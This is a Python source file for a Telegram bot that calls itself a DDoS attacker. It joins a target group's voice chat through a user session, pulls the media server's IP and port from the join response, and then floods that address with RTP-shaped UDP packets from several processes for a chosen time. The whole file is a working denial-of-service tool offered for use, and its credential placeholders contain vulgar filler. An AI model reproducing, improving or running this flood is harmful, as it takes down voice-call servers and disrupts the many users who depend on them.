"" "MADE BY : PANDA-BABY" ""
"IP EXTRACTOR UDP IP + DD0S ATTACKER BOT SCRIPT"


import asyncio
import socket
import os
import time
from pyrogram.raw.functions.channels import GetFullChannel
from pyrogram import Client, filters, idle
from pyrogram.types import (
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    CallbackQuery,
    Message,
)
from pyrogram.raw.functions.phone import GetGroupCall
from pyrogram.raw.types import InputGroupCall

# ─── Global State ─────────────────────────────────────────────────────────────
state = {
    "session":     None,
    "userbot":     None,
    "name":        None,
    "username":    None,
    "user_id":     None,
    "target_ip":   None,
    "target_port": None,
    "chat_id":     None,
    "attacking":   False,
    "atk_task":    None,
    "await_input": None,
    "input_step":  None,
    "input_data":  {},
}

DC_IPS = {
    1: "149.154.175.50",
    2: "149.154.167.51",
    3: "149.154.175.100",
    4: "149.154.167.91",
    5: "91.108.56.100",
}

# ─── Bot Client ───────────────────────────────────────────────────────────────
API_ID   = int(os.getenv("API_ID", "MERA LAND"))
API_HASH = os.getenv("API_HASH", "YAHA BHI MERA LAND")

bot = Client(
    "attacker_bot",
    api_id="YAHA BHI MERA HE LAND",
    api_hash="YAHA PAR BHI MERA HE LAND HAI",
    bot_token="AUR YAHA PAR BHI HAI LAND",
)

# ─── UI ───────────────────────────────────────────────────────────────────────
def main_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📥 ꜱᴇᴛ ꜱᴇꜱꜱɪᴏɴ",  callback_data="set_sess")],
        [InlineKeyboardButton("🔍 ɢᴇᴛ ɪᴘ / ᴘᴏʀᴛ", callback_data="get_ip")],
        [InlineKeyboardButton("⚡ ꜱᴛᴀʀᴛ ᴀᴛᴛᴀᴄᴋ",   callback_data="start_atk")],
        [InlineKeyboardButton("🛑 ꜱᴛᴏᴘ ᴀᴛᴛᴀᴄᴋ",    callback_data="stop_atk")],
    ])

def status_text():
    ip    = state["target_ip"]   or "ɴᴏɴᴇ"
    port  = state["target_port"] or "ɴᴏɴᴇ"
    cid   = state["chat_id"]     or "ɴᴏɴᴇ"
    name  = state["name"]        or "ɴᴏᴛ ꜱᴇᴛ"
    uname = ("@" + state["username"]) if state["username"] else "ɴᴏɴᴇ"
    uid   = state["user_id"]     or "ɴᴏɴᴇ"
    atk   = "🔴 ᴀᴄᴛɪᴠᴇ" if state["attacking"] else "⚪ ɪᴅʟᴇ"
    return (
        "**⚡ ᴠᴄ ᴀᴛᴛᴀᴄᴋᴇʀ ʙᴏᴛ ⚡**\n\n"
        f"👤 ɴᴀᴍᴇ    : `{name}`\n"
        f"🔖 ᴜ_ɴᴀᴍᴇ  : `{uname}`\n"
        f"🆔 ᴜ_ɪᴅ    : `{uid}`\n\n"
        f"🌐 ɪᴘ      : `{ip}`\n"
        f"🔌 ᴘᴏʀᴛ    : `{port}`\n"
        f"💬 ᴄʜᴀᴛ ɪᴅ : `{cid}`\n\n"
        f"💥 ꜱᴛᴀᴛᴜꜱ  : {atk}"
    )

# ─── Userbot Helpers ──────────────────────────────────────────────────────────
async def stop_userbot():
    if state["userbot"]:
        try:
            await state["userbot"].stop()
        except Exception:
            pass
        state["userbot"] = None

async def start_userbot(session_string: str):
    await stop_userbot()
    ub = Client(
        "userbot_session",
        api_id=API_ID,
        api_hash=API_HASH,
        session_string=session_string,
        no_updates=True,
    )
    await ub.start()
    me = await ub.get_me()
    state["userbot"]  = ub
    state["session"]  = session_string
    state["name"]     = me.first_name + (" " + me.last_name if me.last_name else "")
    state["username"] = me.username
    state["user_id"]  = me.id
    return me

# ─── IP Extraction ────────────────────────────────────────────────────────────
# ─── Updated IP Extraction ────────────────────────────────────────────────────────────
async def extract_vc_info(chat_id: int) -> bool:
    ub = state["userbot"]
    if not ub:
        return False

    try:
        import json
        import random
        import re
        from pyrogram.raw.functions.channels import GetFullChannel
        from pyrogram.raw.functions.phone import JoinGroupCall, LeaveGroupCall
        from pyrogram.raw.types import InputGroupCall, InputPeerSelf, DataJSON

        peer = await ub.resolve_peer(chat_id)
        full = await ub.invoke(GetFullChannel(channel=peer))
        call = getattr(full.full_chat, "call", None)

        if not call:
            print("[-] No active VC")
            return False

        input_call = InputGroupCall(id=call.id, access_hash=call.access_hash)

        # pehle leave karo cleanly
        try:
            await ub.invoke(LeaveGroupCall(call=input_call, source=0))
            await asyncio.sleep(1)
        except Exception:
            pass

        ssrc = random.randint(10000000, 99999999)
        ufrag = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=8))
        pwd   = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=22))

        params_data = json.dumps({
            "ufrag": ufrag,
            "pwd": pwd,
            "fingerprints": [],
            "ssrc": ssrc,
            "ssrc-groups": []
        })

        # join karo aur RESPONSE capture karo
        join_result = await ub.invoke(
            JoinGroupCall(
                call=input_call,
                join_as=InputPeerSelf(),
                params=DataJSON(data=params_data),
                muted=True,
            )
        )

        print(f"[*] Joined SSRC={ssrc}")
        print(f"[DEBUG] join_result type: {type(join_result)}")
        print(f"[DEBUG] join_result: {join_result}")

        # Telegram join response mein transport info hoti hai
        found_ip   = None
        found_port = None

        # Method 1: updates ke andar PhoneGroupCallParticipants ya transport parse karo
        updates = getattr(join_result, "updates", [])
        for upd in updates:
            print(f"[DEBUG] update: {upd}")
            # params field mein JSON hota hai jisme ip:port hota hai
            params = getattr(upd, "params", None)
            if params:
                raw = getattr(params, "data", "")
                print(f"[DEBUG] params.data: {raw}")
                try:
                    d = json.loads(raw)
                    # transport candidates
                    transport = d.get("transport", {})
                    candidates = transport.get("candidates", [])
                    for c in candidates:
                        ip   = c.get("ip", "")
                        port = c.get("port", 0)
                        typ  = c.get("type", "")
                        print(f"[DEBUG] candidate: {ip}:{port} type={typ}")
                        if typ in ("relay", "srflx", "host"):
                            if (
                                ip.startswith("91.")
                                or ip.startswith("185.")
                                or ip.startswith("149.154.")
                            ):
                                found_ip   = ip
                                found_port = int(port)
                                break
                    if not found_ip:
                        # direct url field
                        for c in candidates:
                            ip   = c.get("ip", "")
                            port = c.get("port", 0)
                            if ip and port:
                                found_ip   = ip
                                found_port = int(port)
                                break
                except Exception as pe:
                    print(f"[DEBUG] parse error: {pe}")

        # Method 2: full join_result string se regex
        if not found_ip:
            raw_str = str(join_result)
            print(f"[DEBUG] full str: {raw_str[:500]}")
            m = re.search(
                r'(91\.\d+\.\d+\.\d+|185\.\d+\.\d+\.\d+|149\.154\.\d+\.\d+)[^\d](\d{4,5})',
                raw_str
            )
            if m:
                found_ip   = m.group(1)
                found_port = int(m.group(2))
                print(f"[*] Regex found: {found_ip}:{found_port}")

        # leave
        try:
            await ub.invoke(LeaveGroupCall(call=input_call, source=ssrc))
            print("[*] Left VC")
        except Exception:
            pass

        if found_ip and found_port:
            state["target_ip"]   = found_ip
            state["target_port"] = found_port
            state["chat_id"]     = chat_id
            print(f"[✓] Locked: {found_ip}:{found_port}")
            return True

        print("[-] IP nahi mila")
        return False

    except Exception as e:
        import traceback
        print(f"[-] extract_vc_info: {e}")
        traceback.print_exc()
        return False
# ─── UDP Flood ────────────────────────────────────────────────────────────────
import os
import struct
import random
import multiprocessing

def _flood_worker(ip, port, threads, duration, stop_event):
    """Runs in separate process — bypasses GIL"""
    import socket, time, os, struct, random

    def make_rtp_packet(ssrc):
        # valid RTP header — server process karta hai toh disrupt hota hai
        version    = 0x80          # V=2, P=0, X=0, CC=0
        payload_type = 0x60        # PT=96 (dynamic)
        seq        = random.randint(0, 65535)
        timestamp  = random.randint(0, 2**32 - 1)
        header = struct.pack(">BBHII",
            version,
            payload_type,
            seq,
            timestamp,
            ssrc,
        )
        # random payload 1200 bytes (MTU size — maximum disruption)
        return header + os.urandom(1200)

    ssrc     = random.randint(10000000, 99999999)
    deadline = time.monotonic() + duration

    socks = [
        socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for _ in range(threads)
    ]
    for s in socks:
        s.setblocking(False)

    while time.monotonic() < deadline and not stop_event.is_set():
        pkt = make_rtp_packet(ssrc)
        for s in socks:
            try:
                s.sendto(pkt, (ip, port))
            except BlockingIOError:
                pass

    for s in socks:
        s.close()


async def udp_flood(ip: str, port: int, threads: int, duration: int) -> str:
    state["attacking"] = True

    stop_event = multiprocessing.Event()

    # CPU core count ke hisaab se workers
    num_workers = min(multiprocessing.cpu_count(), 4)

    workers = []
    for _ in range(num_workers):
        p = multiprocessing.Process(
            target=_flood_worker,
            args=(ip, port, threads, duration, stop_event),
            daemon=True,
        )
        p.start()
        workers.append(p)

    print(f"[*] Flood → {ip}:{port} | workers={num_workers} | threads={threads} | {duration}s")

    deadline = asyncio.get_event_loop().time() + duration
    while state["attacking"] and asyncio.get_event_loop().time() < deadline:
        await asyncio.sleep(0.5)

    # cleanup
    stop_event.set()
    for p in workers:
        p.terminate()
        p.join(timeout=2)

    state["attacking"] = False
    return f"✅ ꜰɪɴɪꜱʜᴇᴅ ᴀᴛᴛᴀᴄᴋ ᴏɴ `{ip}:{port}`"

async def _run_attack_and_notify(msg, ip, port, threads, duration):
    result = await udp_flood(ip, port, threads, duration)
    try:
        await msg.edit_text(result + "\n\n" + status_text(), reply_markup=main_menu())
    except Exception:
        pass

# ─── Input State Machine ──────────────────────────────────────────────────────
@bot.on_message(filters.private & ~filters.command("start"), group=1)
async def input_handler(client: Client, message: Message):
    step = state.get("await_input")
    if not step:
        return

    text = message.text.strip() if message.text else ""

    # ── SET SESSION ──────────────────────────────────────────────────────────
    if step == "session":
        await message.delete()
        probe_msg = state["input_data"].get("probe_msg")

        try:
            me = await start_userbot(text)
        except Exception as e:
            if probe_msg:
                await probe_msg.edit_text(
                    f"❌ **ꜱᴇꜱꜱɪᴏɴ ꜰᴀɪʟᴇᴅ**\n\n`{e}`",
                    reply_markup=main_menu(),
                )
            state["await_input"] = None
            state["input_data"]  = {}
            return

        state["await_input"] = None
        state["input_data"]  = {}

        if probe_msg:
            await probe_msg.edit_text(
                f"✅ **ꜱᴇꜱꜱɪᴏɴ ꜱᴇᴛ**\n\n"
                f"👤 ɴᴀᴍᴇ   : `{state['name']}`\n"
                f"🔖 ᴜ_ɴᴀᴍᴇ : `{'@' + state['username'] if state['username'] else 'ɴᴏɴᴇ'}`\n"
                f"🆔 ᴜ_ɪᴅ   : `{state['user_id']}`",
                reply_markup=main_menu(),
            )

    # ── GET IP ───────────────────────────────────────────────────────────────
    elif step == "chat_id":
        await message.delete()
        probe_msg = state["input_data"].get("probe_msg")

        try:
            chat_id = int(text)
        except ValueError:
            if probe_msg:
                await probe_msg.edit_text(
                    "❌ **ɪɴᴠᴀʟɪᴅ ᴄʜᴀᴛ ɪᴅ** — ᴍᴜꜱᴛ ʙᴇ ᴀɴ ɪɴᴛᴇɢᴇʀ",
                    reply_markup=main_menu(),
                )
            state["await_input"] = None
            state["input_data"]  = {}
            return

        if probe_msg:
            await probe_msg.edit_text("🔍 **ᴇxᴛʀᴀᴄᴛɪɴɢ ɪᴘ....**")

        ok = await extract_vc_info(chat_id)
        state["await_input"] = None
        state["input_data"]  = {}

        if probe_msg:
            if ok:
                await probe_msg.edit_text(
                    f"✅ **ᴛᴀʀɢᴇᴛ ʟᴏᴄᴋᴇᴅ**\n\n"
                    f"🌐 ɪᴘ      : `{state['target_ip']}`\n"
                    f"🔌 ᴘᴏʀᴛ    : `{state['target_port']}`\n"
                    f"💬 ᴄʜᴀᴛ ɪᴅ : `{state['chat_id']}`",
                    reply_markup=main_menu(),
                )
            else:
                await probe_msg.edit_text(
                    "❌ **ꜰᴀɪʟᴇᴅ** — ɴᴏ ᴀᴄᴛɪᴠᴇ ᴠᴄ ᴏʀ ᴜꜱᴇʀʙᴏᴛ ɴᴏᴛ ɪɴ ɢʀᴏᴜᴘ",
                    reply_markup=main_menu(),
                )

    # ── ATTACK MULTI-STEP ─────────────────────────────────────────────────────
    elif step == "atk_ip":
        await message.delete()
        state["input_data"]["ip"] = text
        state["await_input"]      = "atk_port"
        probe_msg = state["input_data"].get("probe_msg")
        if probe_msg:
            await probe_msg.edit_text(
                "🔌 **ꜱᴇɴᴅ ᴘᴏʀᴛ**\n_(ᴅᴇꜰᴀᴜʟᴛ: 1935)_"
            )

    elif step == "atk_port":
        await message.delete()
        try:
            state["input_data"]["port"] = int(text) if text else 1935
        except ValueError:
            state["input_data"]["port"] = 1935
        state["await_input"] = "atk_threads"
        probe_msg = state["input_data"].get("probe_msg")
        if probe_msg:
            await probe_msg.edit_text(
                "🧵 **ꜱᴇɴᴅ ᴛʜʀᴇᴀᴅꜱ**\n_(ᴅᴇꜰᴀᴜʟᴛ: 8)_"
            )

    elif step == "atk_threads":
        await message.delete()
        try:
            state["input_data"]["threads"] = int(text) if text else 8
        except ValueError:
            state["input_data"]["threads"] = 8
        state["await_input"] = "atk_duration"
        probe_msg = state["input_data"].get("probe_msg")
        if probe_msg:
            await probe_msg.edit_text(
                "⏱️ **ꜱᴇɴᴅ ᴅᴜʀᴀᴛɪᴏɴ (ꜱᴇᴄᴏɴᴅꜱ)**\n_(ᴅᴇꜰᴀᴜʟᴛ: 60)_"
            )

    elif step == "atk_duration":
        await message.delete()
        try:
            duration = int(text) if text else 60
        except ValueError:
            duration = 60

        d         = state["input_data"]
        ip        = d.get("ip")      or state["target_ip"]
        port      = d.get("port")    or state["target_port"] or 1935
        threads   = d.get("threads") or 8
        probe_msg = d.get("probe_msg")

        state["await_input"] = None
        state["input_data"]  = {}

        if not ip:
            if probe_msg:
                await probe_msg.edit_text(
                    "❌ **ɴᴏ ɪᴘ** — ᴜꜱᴇ 🔍 ɢᴇᴛ ɪᴘ ꜰɪʀꜱᴛ ᴏʀ ᴇɴᴛᴇʀ ɪᴘ ᴍᴀɴᴜᴀʟʟʏ",
                    reply_markup=main_menu(),
                )
            return

        state["target_ip"]   = ip
        state["target_port"] = port

        if probe_msg:
            await probe_msg.edit_text(
                f"⚡ **ꜱᴛᴀʀᴛɪɴɢ ᴀᴛᴛᴀᴄᴋ**\n\n"
                f"🌐 ɪᴘ       : `{ip}`\n"
                f"🔌 ᴘᴏʀᴛ     : `{port}`\n"
                f"💬 ᴄʜᴀᴛ ɪᴅ  : `{state['chat_id'] or 'ɴ/ᴀ'}`\n"
                f"🧵 ᴛʜʀᴇᴀᴅꜱ  : `{threads}`\n"
                f"⏱️ ᴅᴜʀᴀᴛɪᴏɴ : `{duration}s`",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🛑 ꜱᴛᴏᴘ ᴀᴛᴛᴀᴄᴋ", callback_data="stop_atk")]
                ]),
            )

        if state["atk_task"] and not state["atk_task"].done():
            state["atk_task"].cancel()

        state["atk_task"] = asyncio.create_task(
            _run_attack_and_notify(probe_msg, ip, port, threads, duration)
        )

# ─── Start Command ────────────────────────────────────────────────────────────
@bot.on_message(filters.command("start") & filters.private, group=0)
async def cmd_start(client: Client, message: Message):
    welcome = (
        "**⚡ ᴠᴄ ᴀᴛᴛᴀᴄᴋᴇʀ ʙᴏᴛ ⚡**\n\n"
        "🔧 **ꜱᴇᴛᴜᴘ ꜱᴛᴇᴘꜱ:**\n"
        "1️⃣ ᴄʟɪᴄᴋ 📥 ꜱᴇᴛ ꜱᴇꜱꜱɪᴏɴ\n"
        "2️⃣ ᴘᴀꜱᴛᴇ ʏᴏᴜʀ ᴘʏʀᴏɢʀᴀᴍ ꜱᴇꜱꜱɪᴏɴ ꜱᴛʀɪɴɢ\n"
        "3️⃣ ᴄʟɪᴄᴋ 🔍 ɢᴇᴛ ɪᴘ/ᴘᴏʀᴛ & ᴘᴀꜱᴛᴇ ᴠᴄ ɢʀᴏᴜᴘ ɪᴅ\n"
        "4️⃣ ᴄʟɪᴄᴋ ⚡ ꜱᴛᴀʀᴛ ᴀᴛᴛᴀᴄᴋ & ꜰɪʟʟ ɪɴ ᴅᴇᴛᴀɪʟꜱ\n\n"
        f"{status_text()}"
    )
    await message.reply(
        welcome,
        reply_markup=main_menu(),
    )


    # ... rest same
# ─── Callback Handler ─────────────────────────────────────────────────────────
@bot.on_callback_query()
async def cb_handler(client: Client, cb: CallbackQuery):
    data = cb.data
    msg  = cb.message

    if data == "set_sess":
        state["await_input"]             = "session"
        state["input_data"]              = {}
        state["input_data"]["probe_msg"] = msg
        await msg.edit_text(
            "📥 **ꜱᴇɴᴅ ʏᴏᴜʀ ᴘʏʀᴏɢʀᴀᴍ ꜱᴇꜱꜱɪᴏɴ ꜱᴛʀɪɴɢ**\n"
            "_ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ʙᴇ ᴅᴇʟᴇᴛᴇᴅ ᴀᴜᴛᴏᴍᴀᴛɪᴄᴀʟʟʏ_"
        )

    elif data == "get_ip":
        if not state["userbot"]:
            await cb.answer("⚠️ Set session first!", show_alert=True)
            return
        state["await_input"]             = "chat_id"
        state["input_data"]              = {}
        state["input_data"]["probe_msg"] = msg
        await msg.edit_text(
            "💬 **ꜱᴇɴᴅ ᴄʜᴀᴛ ɪᴅ ᴏꜰ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ɢʀᴏᴜᴘ**\n"
            "_ᴇ.ɢ. `-1001234567890`_"
        )

    elif data == "start_atk":
        if state["attacking"]:
            await cb.answer("⚡ Already attacking!", show_alert=True)
            return

        state["input_data"]              = {}
        state["input_data"]["probe_msg"] = msg

        if state["target_ip"]:
            state["input_data"]["ip"]   = state["target_ip"]
            state["input_data"]["port"] = state["target_port"] or 1935
            state["await_input"]        = "atk_threads"
            await msg.edit_text(
                f"✅ **ᴜꜱɪɴɢ ꜱᴀᴠᴇᴅ ɪᴘ** `{state['target_ip']}:{state['target_port']}`\n\n"
                "🧵 **ꜱᴇɴᴅ ᴛʜʀᴇᴀᴅꜱ**\n_(ᴅᴇꜰᴀᴜʟᴛ: 8)_"
            )
        else:
            state["await_input"] = "atk_ip"
            await msg.edit_text("🌐 **ꜱᴇɴᴅ ᴛᴀʀɢᴇᴛ ɪᴘ**")

    elif data == "stop_atk":
        state["attacking"] = False
        if state["atk_task"] and not state["atk_task"].done():
            state["atk_task"].cancel()
        state["await_input"] = None
        state["input_data"]  = {}
        await msg.edit_text(
            "🛑 **ᴀᴛᴛᴀᴄᴋ ꜱᴛᴏᴘᴘᴇᴅ**\n\n" + status_text(),
            reply_markup=main_menu(),
        )

    await cb.answer()

# ─── Entrypoint ───────────────────────────────────────────────────────────────
if __name__ == "__main__":
    bot.run()
